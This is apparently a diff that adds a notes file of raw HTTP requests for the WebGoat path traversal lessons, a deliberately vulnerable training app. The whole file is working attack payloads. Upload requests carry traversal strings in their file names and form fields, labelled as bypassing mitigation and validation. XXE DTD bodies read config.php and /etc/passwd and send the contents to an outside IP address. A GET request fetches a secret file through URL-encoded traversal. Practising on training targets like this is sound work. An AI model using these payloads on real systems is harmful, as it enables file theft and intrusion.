@@ -1,0 +1,141 @@
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+POST /WebGoat/PathTraversal/profile-upload HTTP/1.1
+
+POST /WebGoat/PathTraversal/profile-upload HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------1072082215130959357796887703
+Content-Length: 794
+Connection: close
+Cookie: JSESSIONID=HQUIuQnrHraA513DXTTmkxd8eu71LZVyP-D47l7Y
+
+-----------------------------1072082215130959357796887703
+Content-Disposition: form-data; name="uploadedFile"; filename="toasted.dtd"
+Content-Type: application/xml-dtd
+
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:////var/www/html/docx2pdf/config.php"> 
+<!ENTITY % inception "<!ENTITY exfil SYSTEM 'http://10.10.14.126/data?%data;'>">
+
+-----------------------------1072082215130959357796887703
+Content-Disposition: form-data; name="fullName"
+
+../THINGY
+-----------------------------1072082215130959357796887703
+Content-Disposition: form-data; name="email"
+
+thing@thing.org
+-----------------------------1072082215130959357796887703
+Content-Disposition: form-data; name="password"
+
+THINGTHING
+-----------------------------1072082215130959357796887703--
+
+
+++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++ (bypass initial mitigation)
+
+POST /WebGoat/PathTraversal/profile-upload-fix HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------1280713968011282201102829451
+Content-Length: 802
+Connection: close
+Cookie: JSESSIONID=HQUIuQnrHraA513DXTTmkxd8eu71LZVyP-D47l7Y
+
+-----------------------------1280713968011282201102829451
+Content-Disposition: form-data; name="uploadedFileFix"; filename="toasted.dtd"
+Content-Type: application/xml-dtd
+
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:////var/www/html/docx2pdf/config.php"> 
+<!ENTITY % inception "<!ENTITY exfil SYSTEM 'http://10.10.14.126/data?%data;'>">
+
+-----------------------------1280713968011282201102829451
+Content-Disposition: form-data; name="fullNameFix"
+
+....//BLAB
+-----------------------------1280713968011282201102829451
+Content-Disposition: form-data; name="emailFix"
+
+blab@blab.org
+-----------------------------1280713968011282201102829451
+Content-Disposition: form-data; name="passwordFix"
+
+THINGTHING
+-----------------------------1280713968011282201102829451--
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+++++++++++++++++++++++++ (foil user input validation)
+
+POST /WebGoat/PathTraversal/profile-upload-remove-user-input HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------15820103538998596091066910092
+Content-Length: 780
+Connection: close
+Cookie: JSESSIONID=HQUIuQnrHraA513DXTTmkxd8eu71LZVyP-D47l7Y
+
+-----------------------------15820103538998596091066910092
+Content-Disposition: form-data; name="uploadedFileRemoveUserInput"; filename="../death.dtd"
+Content-Type: application/xml-dtd
+
+<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/////etc/passwd"> 
+<!ENTITY % inception "<!ENTITY exfil SYSTEM 'http://10.10.14.126/data?%data;'>">
+
+-----------------------------15820103538998596091066910092
+Content-Disposition: form-data; name="fullName"
+
+BOOB
+-----------------------------15820103538998596091066910092
+Content-Disposition: form-data; name="email"
+
+boob@boob.org
+-----------------------------15820103538998596091066910092
+Content-Disposition: form-data; name="password"
+
+BOOBBOOB
+-----------------------------15820103538998596091066910092--
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret.jpg HTTP/1.1
+
+GET /WebGoat/PathTraversal/random-picture?id=%2e%2e%2f%2e%2e%2fpath-traversal-secret HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/WebGoat/start.mvc
+X-Requested-With: XMLHttpRequest
+Connection: close
+Cookie: JSESSIONID=HQUIuQnrHraA513DXTTmkxd8eu71LZVyP-D47l7Y
+Content-Length: 128
+
+4f616a2db1338764096260ec8d198219400ae6dc281bbb3928ae3d1464dab23f258052db198d125f81dffa720ff931c4609d37a08b15a626ed75cc629a7ec188
+
+
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++
